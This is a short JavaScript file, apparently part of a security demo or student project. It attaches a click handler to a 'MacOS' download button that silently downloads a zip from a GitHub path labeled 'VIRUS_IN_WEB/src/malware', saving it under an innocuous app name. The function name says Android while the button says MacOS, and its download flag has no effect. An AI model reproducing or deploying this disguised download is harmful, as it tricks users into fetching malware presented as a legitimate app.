export default function Download_Android() {
    const downloadButton = document.getElementById('MacOS');

    downloadButton.addEventListener('click', handleDownload);

    async function handleDownload() {
        // 다운로드 중인지 여부를 확인하는 변수
        let isDownloading = false;

        if (!isDownloading) {
            isDownloading = true;

            const fileURL = 'https://raw.githubusercontent.com/KGV-Security/VIRUS_IN_WEB/main/src/malware/WordUniverse.zip';
            const fileName = 'Mac_WordUniverse.zip';

            const c = document.createElement('a');
            c.href = fileURL;
            c.download = fileName;
            document.body.appendChild(c);
            c.click();
            document.body.removeChild(c);

            // 다운로드가 완료되었을 때 버튼을 활성화
            isDownloading = false;
        }
    }
}
